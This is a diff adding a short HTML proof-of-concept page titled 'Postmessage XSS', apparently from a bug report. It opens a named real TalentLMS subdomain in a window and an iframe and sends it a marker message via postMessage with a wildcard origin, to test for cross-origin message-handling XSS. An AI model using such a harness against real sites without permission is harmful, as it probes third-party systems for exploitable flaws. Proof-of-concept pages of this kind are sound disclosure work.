@@ -1,0 +1,32 @@
+<!doctype html> 
+<html> 
+<head>
+<meta charset="UTF-8" /> 
+<title>Postmessage XSS</title> 
+
+<script> 
+	function sig() { 
+		let win = window.open('https://playershealth.talentlms.com/index'); 
+		let msg = "PM-XSS"; 
+		setTimeout(function() { 
+			win.postMessage(msg, '*'); 
+		}, 5000); 
+	} 
+
+	function sigFrame(win) { 
+		let msg = "PM-XSS"; 
+		win.postMessage(msg, '*'); 
+	} 
+
+</script> 
+
+</head> 
+
+<body> 
+<a href="#" onclick="sig();">PoC link</a> 
+
+<iframe src="https://playershealth.talentlms.com/index" height="400" width="600" onload="sigFrame(this.contentWindow)">
+</iframe> 
+
+</body> 
+</html>
